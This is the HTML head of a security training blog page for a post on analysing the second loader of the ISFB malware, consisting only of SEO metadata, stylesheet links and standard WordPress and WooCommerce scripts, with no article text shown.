<!doctype html>
<html dir="ltr" lang="en-GB" prefix="og: https://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Analyzing ISFB – The Second Loader | 0ffset Training Solutions</title>

		<!-- All in One SEO 4.5.3.1 - aioseo.com -->
		<meta name="description" content="So it&#039;s been quite a while since my last post, however now that my Beginner Malware Analysis Course is complete, the posts should be more and more frequent, although that obviously depends on the complexity of the samples I am analyzing. If you haven&#039;t checked out my last post on ISFB where we analyzed the" />
		<meta name="robots" content="max-image-preview:large" />
		<link rel="canonical" href="https://www.0ffset.net/reverse-engineering/analyzing-isfb-second-loader/" />
		<meta name="generator" content="All in One SEO (AIOSEO) 4.5.3.1" />
		<meta property="og:locale" content="en_GB" />
		<meta property="og:site_name" content="0ffset Training Solutions | Practical and Affordable Cyber Security Training" />
		<meta property="og:type" content="article" />
		<meta property="og:title" content="Analyzing ISFB – The Second Loader | 0ffset Training Solutions" />
		<meta property="og:description" content="So it&#039;s been quite a while since my last post, however now that my Beginner Malware Analysis Course is complete, the posts should be more and more frequent, although that obviously depends on the complexity of the samples I am analyzing. If you haven&#039;t checked out my last post on ISFB where we analyzed the" />
		<meta property="og:url" content="https://www.0ffset.net/reverse-engineering/analyzing-isfb-second-loader/" />
		<meta property="og:image" content="https://0ffset.net/wp-content/uploads/2021/05/z2a_logo.png" />
		<meta property="og:image:secure_url" content="https://0ffset.net/wp-content/uploads/2021/05/z2a_logo.png" />
		<meta property="article:published_time" content="2019-05-25T21:10:17+00:00" />
		<meta property="article:modified_time" content="2021-07-01T08:39:49+00:00" />
		<meta name="twitter:card" content="summary_large_image" />
		<meta name="twitter:site" content="@0verfl0w_" />
		<meta name="twitter:title" content="Analyzing ISFB – The Second Loader | 0ffset Training Solutions" />
		<meta name="twitter:description" content="So it&#039;s been quite a while since my last post, however now that my Beginner Malware Analysis Course is complete, the posts should be more and more frequent, although that obviously depends on the complexity of the samples I am analyzing. If you haven&#039;t checked out my last post on ISFB where we analyzed the" />
		<meta name="twitter:creator" content="@0verfl0w_" />
		<meta name="twitter:image" content="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1.png" />
		<script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"BlogPosting","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#blogposting","name":"Analyzing ISFB \u2013 The Second Loader | 0ffset Training Solutions","headline":"Analyzing ISFB &#8211; The Second Loader","author":{"@id":"https:\/\/www.0ffset.net\/author\/dan489400\/#author"},"publisher":{"@id":"https:\/\/www.0ffset.net\/#organization"},"image":{"@type":"ImageObject","url":"https:\/\/www.0ffset.net\/wp-content\/uploads\/2021\/06\/Screenshot_6-1.png","width":857,"height":615},"datePublished":"2019-05-25T22:10:17+01:00","dateModified":"2021-07-01T09:39:49+01:00","inLanguage":"en-GB","commentCount":1,"mainEntityOfPage":{"@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#webpage"},"isPartOf":{"@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#webpage"},"articleSection":"Malware Analysis, Reverse Engineering"},{"@type":"BreadcrumbList","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/www.0ffset.net\/#listItem","position":1,"name":"Home","item":"https:\/\/www.0ffset.net\/","nextItem":"https:\/\/www.0ffset.net\/category\/reverse-engineering\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.0ffset.net\/category\/reverse-engineering\/#listItem","position":2,"name":"Reverse Engineering","item":"https:\/\/www.0ffset.net\/category\/reverse-engineering\/","nextItem":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#listItem","previousItem":"https:\/\/www.0ffset.net\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#listItem","position":3,"name":"Analyzing ISFB - The Second Loader","previousItem":"https:\/\/www.0ffset.net\/category\/reverse-engineering\/#listItem"}]},{"@type":"Organization","@id":"https:\/\/www.0ffset.net\/#organization","name":"0ffset Training Solutions LTD.","url":"https:\/\/www.0ffset.net\/","logo":{"@type":"ImageObject","url":"https:\/\/0ffset.net\/wp-content\/uploads\/2021\/05\/cropped-z2a_logo.png","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#organizationLogo"},"image":{"@id":"https:\/\/www.0ffset.net\/#organizationLogo"},"sameAs":["https:\/\/twitter.com\/0verfl0w_","https:\/\/www.youtube.com\/channel\/UCy21puSd9R3C5Xn46YI32_g","https:\/\/www.linkedin.com\/company\/0ffset"]},{"@type":"Person","@id":"https:\/\/www.0ffset.net\/author\/dan489400\/#author","url":"https:\/\/www.0ffset.net\/author\/dan489400\/","name":"0verfl0w_","image":{"@type":"ImageObject","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/4646d0a6fcf15f17545b9a8708b8c3b4?s=96&d=mm&r=g","width":96,"height":96,"caption":"0verfl0w_"}},{"@type":"WebPage","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#webpage","url":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/","name":"Analyzing ISFB \u2013 The Second Loader | 0ffset Training Solutions","description":"So it's been quite a while since my last post, however now that my Beginner Malware Analysis Course is complete, the posts should be more and more frequent, although that obviously depends on the complexity of the samples I am analyzing. If you haven't checked out my last post on ISFB where we analyzed the","inLanguage":"en-GB","isPartOf":{"@id":"https:\/\/www.0ffset.net\/#website"},"breadcrumb":{"@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#breadcrumblist"},"author":{"@id":"https:\/\/www.0ffset.net\/author\/dan489400\/#author"},"creator":{"@id":"https:\/\/www.0ffset.net\/author\/dan489400\/#author"},"image":{"@type":"ImageObject","url":"https:\/\/www.0ffset.net\/wp-content\/uploads\/2021\/06\/Screenshot_6-1.png","@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#mainImage","width":857,"height":615},"primaryImageOfPage":{"@id":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/#mainImage"},"datePublished":"2019-05-25T22:10:17+01:00","dateModified":"2021-07-01T09:39:49+01:00"},{"@type":"WebSite","@id":"https:\/\/www.0ffset.net\/#website","url":"https:\/\/www.0ffset.net\/","name":"0ffset Training Solutions","description":"Practical and Affordable Cyber Security Training","inLanguage":"en-GB","publisher":{"@id":"https:\/\/www.0ffset.net\/#organization"}}]}
		</script>
		<!-- All in One SEO -->

<script src='//cdn.cookie-script.com/s/f7880085be5f53685c89aa7e1abba794.js' id='cookie_script-js'></script><link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="0ffset Training Solutions &raquo; Feed" href="https://www.0ffset.net/feed/" />
<link rel="alternate" type="application/rss+xml" title="0ffset Training Solutions &raquo; Comments Feed" href="https://www.0ffset.net/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="0ffset Training Solutions &raquo; Analyzing ISFB &#8211; The Second Loader Comments Feed" href="https://www.0ffset.net/reverse-engineering/analyzing-isfb-second-loader/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.0ffset.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://www.0ffset.net/wp-includes/css/dist/block-library/style.min.css?ver=6.4.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://www.0ffset.net/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='woocommerce-layout-css' href='https://www.0ffset.net/wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=8.4.0' type='text/css' media='all' />
<link rel='stylesheet' id='woocommerce-smallscreen-css' href='https://www.0ffset.net/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css?ver=8.4.0' type='text/css' media='only screen and (max-width: 768px)' />
<link rel='stylesheet' id='woocommerce-general-css' href='https://www.0ffset.net/wp-content/plugins/woocommerce/assets/css/woocommerce.css?ver=8.4.0' type='text/css' media='all' />
<style id='woocommerce-inline-inline-css' type='text/css'>
.woocommerce form .form-row .required { visibility: visible; }
</style>
<link rel='stylesheet' id='engitech-fonts-css' href='https://fonts.googleapis.com/css?family=Montserrat%3A100%2C100i%2C200%2C200i%2C300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i%7CNunito+Sans%3A200%2C200i%2C300%2C300i%2C400%2C400i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/bootstrap.css?ver=4.0' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-awesome-font-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/font-awesome.min.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-flaticon-font-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/flaticon.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='slick-slider-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/slick.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='slick-theme-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/slick-theme.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='magnific-popup-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/magnific-popup.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-style-css' href='https://www.0ffset.net/wp-content/themes/engitech/style.css?ver=1.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='simple-likes-public-css-css' href='https://www.0ffset.net/wp-content/themes/engitech/inc/backend/css/simple-likes-public.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-preload-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/royal-preload.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-woocommerce-style-css' href='https://www.0ffset.net/wp-content/themes/engitech/css/woocommerce.css?ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.25.0' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.18.3' type='text/css' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min.css?ver=5.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-12-css' href='https://www.0ffset.net/wp-content/uploads/elementor/css/post-12.css?ver=1703230940' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-pro-css' href='https://www.0ffset.net/wp-content/plugins/elementor-pro/assets/css/frontend.min.css?ver=3.18.2' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-7991-css' href='https://www.0ffset.net/wp-content/uploads/elementor/css/post-7991.css?ver=1703230942' type='text/css' media='all' />
<link rel='stylesheet' id='engitech-child-style-css' href='https://www.0ffset.net/wp-content/themes/ChildTheme/style.css?ver=1.1' type='text/css' media='all' />
<link rel='stylesheet' id='eael-general-css' href='https://www.0ffset.net/wp-content/plugins/essential-addons-for-elementor-lite/assets/front-end/css/view/general.min.css?ver=5.9.3' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CPoppins%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7COpen+Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CFjalla+One%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.4.2' type='text/css' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2" id="wp-polyfill-inert-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.14.0" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://stats.wp.com/w.js?ver=202401" id="woo-tracks-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.8.4.0" id="jquery-blockui-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="wc-add-to-cart-js-extra">
/* <![CDATA[ */
var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"View basket","cart_url":"https:\/\/www.0ffset.net\/cart\/","is_cart":"","cart_redirect_after_add":"no"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=8.4.0" id="wc-add-to-cart-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.8.4.0" id="js-cookie-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="woocommerce-js-extra">
/* <![CDATA[ */
var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=8.4.0" id="woocommerce-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="simple-likes-public-js-js-extra">
/* <![CDATA[ */
var simpleLikes = {"ajaxurl":"https:\/\/www.0ffset.net\/wp-admin\/admin-ajax.php","like":"Like","unlike":"Unlike"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/inc/backend/js/simple-likes-public.js?ver=0.5" id="simple-likes-public-js-js"></script>
